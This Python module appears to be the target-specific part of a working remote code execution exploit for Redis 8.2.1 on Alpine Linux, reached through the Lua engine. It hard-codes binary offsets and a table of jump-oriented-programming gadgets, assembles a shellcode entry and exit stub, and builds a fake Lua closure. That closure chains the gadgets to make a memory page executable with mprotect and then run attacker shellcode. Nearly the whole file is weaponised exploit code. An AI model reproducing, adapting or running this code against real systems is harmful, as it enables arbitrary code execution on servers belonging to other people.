from __future__ import annotations
from iced_x86 import (
    BlockEncoder,
    Code,
    Instruction as Instr,
    MemoryOperand,
    Register,
)
from typing import Optional, Tuple

from .shared import (
    CClosure,
    CoreAddrs,
    ExploitState,
    ShellcodeContext,
    TargetInfo,
)
from .util import u32_le, u64_le

def info() -> TargetInfo:
    return TargetInfo(
        name='redis:8.2.1-alpine',
        redis_version='8.2.1',
        redis_build_id='f5a80511e802827d',
    )

def core_addrs(luaAlloc: int) -> Optional[CoreAddrs]:
    if luaAlloc & 0xFFF != 0xF10:
        return None
    redis_base = luaAlloc - 0x240F10
    mprotect = redis_base + 0x80B90
    pthread_create = redis_base + 0x813B0
    return CoreAddrs(
        luaAlloc=luaAlloc,
        redis_base=redis_base,
        mprotect=mprotect,
        pthread_create=pthread_create,
    )

def create_shellcode(context: ShellcodeContext, shellcode: bytes, shellcode_body_address: int) -> Optional[Tuple[bytes, int]]:
    """Shellcode entry/exit stub for `redis:8.2.1-alpine`."""
    # Call `addReplyBool(client*, true)` to inform client socket that it can close.
    addReplyBool = context.addrs.redis_base + 0xDEB60

    # NOTE: This build does not need to set `curr_run_ctx` to 0 as `scriptResetRun`
    # is called after returning into `evalGenericCommand`.

    # Use evalGenericCommand epilogue as JOP gadget for pops and ret.
    # pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret;
    epilogue_gadget = context.addrs.redis_base + 0x194302

    # Remember entry into shellcode stub.
    entry = len(shellcode)

    # Entry/exit stubs for shellcode for `redis:8.2.1-alpine` target.
    # These instructions aren't space effecient but we aren't very space constrained. :)
    instrs = [
        # Fix RBP/RSP registers.
        Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RBP, Register.RSP),
        Instr.create_reg_i32(Code.ADD_RM64_IMM32, Register.RBP, 0x480),
        Instr.create_reg_i32(Code.ADD_RM64_IMM32, Register.RSP, 0x3B8 - 0x30),

        # Call shellcode body.
        # Assume standard-ish calling convention?
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, shellcode_body_address),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),

        # For debugging:
        # break *(evalGenericCommand+448)

        # Returning into: `evalGenericCommand`
        # Call `addReplyBool(client*, true)`
        Instr.create_reg_mem(Code.MOV_R64_RM64, Register.RDI, MemoryOperand(Register.RSP, displ=(0xC0 + 0x30))),
        Instr.create_reg_i32(Code.MOV_R8_IMM8, Register.SIL, 1),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, addReplyBool),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),
        # Jump into epilogue gadget to restore registers and return.
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, epilogue_gadget),
        Instr.create_reg(Code.JMP_RM64, Register.RAX),
    ]

    # TODO: Actually clean up after ourselves?

    encoder = BlockEncoder(64)
    encoder.add_many(instrs)
    encoded_bytes = encoder.encode(0)

    shellcode += encoded_bytes

    return (shellcode, entry)

class jop(object):
    """JOP gadgets for `redis:8.2.1-alpine` build."""
    # mov rbx, rax ; mov rdi, rax ; call qword ptr [rax + 0x30]
    mov_rbx_rax__mov_rdi_rax__call_qword_ptr_rax_plus_0x30 = 0x155359

    # mov rbp, [rbx+0x38]; mov rdi, rsp; mov [rsp], rax; call qword ptr [rbp+0x130];
    mov_rbp_qword_ptr_rbx_p_0x38__mov_rdi_rsp__mov_qword_ptr_rsp_rax__call_qword_ptr_rbp_p_0x130 = 0x30e236

    # mov rdi, rbx; call qword ptr [rax+0x40];
    mov_rdi_rbx__call_qword_ptr_rax_p_0x40 = 0xc2962

    # mov rdx, [rdi+0x18]; mov qword ptr [rbp-0x30], 0x0; mov rdi, [rdi]; call qword ptr [rax+0x28];
    mov_rdx_qword_ptr_rdi_p_0x18__mov_qword_ptr_rbp_m_0x30_0__mov_rdi_qword_ptr_rdi__call_qword_ptr_rax_p_0x28 = 0x1e6fb4

    # mov rsi, rdi ; mov rdi, r13 ; call qword ptr [rax + 0x10]
    mov_rsi_rdi__mov_rdi_r13__call_qword_ptr_rax_p_0x10 = 0x278217

    # add al, 0x24 ; mov rdi, qword ptr [r12 + 8] ; call qword ptr [rax + 0x38]
    add_al_0x24__mov_rdi_qword_ptr_r12_p_0x8__call_qword_ptr_rax_p_0x38 = 0xf2772

    # add al, 0x4c ; mov dword ptr [rbx], ecx ; sub r9, r12 ; call qword ptr [rbx + 0x68]
    add_al_0x4c__mov_dword_ptr_rbx_ecx__sub_r9_r12__call_qword_ptr_rbx_p_0x68 = 0x23c92d

    # mov rdi, qword ptr [rbx + 8] ; call qword ptr [rbx]
    mov_rdi_qword_ptr_rbx_p_0x8__call_qword_ptr_rbx = 0x1e5bf6

    # call qword ptr [rax + 0x58]
    # mov  rdi, qword ptr [rbx + 0x10]
    # jmp  0xd95cf
    # mov  rax, qword ptr [rdi]
    # call qword ptr [rax + 0x60]
    call_trampoline = 0xd962d

    # mov rax, qword ptr [rax + 0x80] ; jmp rax
    mov_rax_qword_ptr_rax_p_0x80__jmp_rax = 0xffb31

def build_pivot_payload(state: ExploitState) -> Tuple[bytes, bytes]:
    redis_base = state.addrs.redis_base

    mprotect_arg_addr = state.shellcode_page
    mprotect_arg_size = 0x1000
    mprotect_arg_prot = 7

    # Gadgets.
    gadget0 = redis_base + jop.mov_rbx_rax__mov_rdi_rax__call_qword_ptr_rax_plus_0x30
    gadget1 = redis_base + jop.mov_rbp_qword_ptr_rbx_p_0x38__mov_rdi_rsp__mov_qword_ptr_rsp_rax__call_qword_ptr_rbp_p_0x130
    gadget2 = redis_base + jop.mov_rdi_rbx__call_qword_ptr_rax_p_0x40
    gadget3 = redis_base + jop.mov_rdx_qword_ptr_rdi_p_0x18__mov_qword_ptr_rbp_m_0x30_0__mov_rdi_qword_ptr_rdi__call_qword_ptr_rax_p_0x28
    gadget4 = redis_base + jop.mov_rsi_rdi__mov_rdi_r13__call_qword_ptr_rax_p_0x10
    gadget5 = redis_base + jop.add_al_0x24__mov_rdi_qword_ptr_r12_p_0x8__call_qword_ptr_rax_p_0x38
    gadget6 = redis_base + jop.add_al_0x4c__mov_dword_ptr_rbx_ecx__sub_r9_r12__call_qword_ptr_rbx_p_0x68
    gadget7 = redis_base + jop.mov_rdi_qword_ptr_rbx_p_0x8__call_qword_ptr_rbx
    gadget8 = redis_base + jop.call_trampoline
    gadget9 = redis_base + jop.mov_rax_qword_ptr_rax_p_0x80__jmp_rax

    # Build CClosure.
    # RIP pivot has RAX pointing to our CClosure, so some JOP details are intertwined here.
    cclosure = CClosure(
        p_gclist=gadget5,
        p_env=mprotect_arg_prot,
        p_function=gadget0)
    cclosure_bytes = cclosure.build(next=mprotect_arg_size)
    assert(len(cclosure_bytes) == 0x28)

    # We use a gadget to set RBP so that another gadget may assign: `qword ptr RBP[-0x30] = 0`
    # Just load our "base" (megabin CClosure) address into RBP for easy reasoning.
    rbp = state.megabin_address + 0x50

    # Build the JOP-specific parts of the megabin.
    jopdata = b''
    jopdata += u64_le(gadget4) # Base + 0x28
    jopdata += u64_le(gadget1) # Base + 0x30
    jopdata += u64_le(rbp)     # Base + 0x38
    jopdata += u64_le(gadget3) # Base + 0x40
    jopdata += u32_le(0x50)    # Base + 0x48
    jopdata += b'\x00' * 0x10  # Base + 0x4C
    jopdata += u64_le(gadget5) # Base + 0x5C
    jopdata += b'\x00' * 0x4   # Base + 0x64
    jopdata += u64_le(gadget0) # Base + 0x68
    jopdata += b'\x00' * 0x10  # Base + 0x70
    jopdata += u64_le(gadget6) # Base + 0x80
    jopdata += b'\x00' * 0xC   # Base + 0x88
    jopdata += u64_le(gadget8) # Base + 0x94
    jopdata += u64_le(mprotect_arg_addr) # Base + 0xA0
    # NOTE: Loaded into RDI, then: `CALL qword ptr [[RDI] + 0x60]`
    # Let's just have it call via [Base + 0xB0] -> [Base + 0xB8]?
    jopdata += u64_le(state.megabin_address + 0x50 + 0xB0) # Base + 0xA4
    jopdata += b'\x00' * 0x4 # Base + 0xAC
    jopdata += u64_le(state.megabin_address + 0x50 + (0xB8 - 0x60)) # Base + 0xB0
    jopdata += u64_le(state.shellcode_entry) # Base + 0xB8
    jopdata += b'\x00' * 0x4   # Base + 0xC0
    jopdata += u64_le(gadget7) # Base + 0xC4
    jopdata += b'\x00' * 0x20  # Base + 0xCC
    jopdata += u64_le(gadget9) # Base + 0xEC
    jopdata += b'\x00' * 0x20  # Base + 0xF4
    jopdata += u64_le(state.addrs.mprotect) # Base + 0x114
    jopdata += b'\x00' * 0x14  # Base + 0x11C
    jopdata += u64_le(gadget2) # Base + 0x130
    assert(len(jopdata) == (0x138 - 0x28))

    return (cclosure_bytes, jopdata)
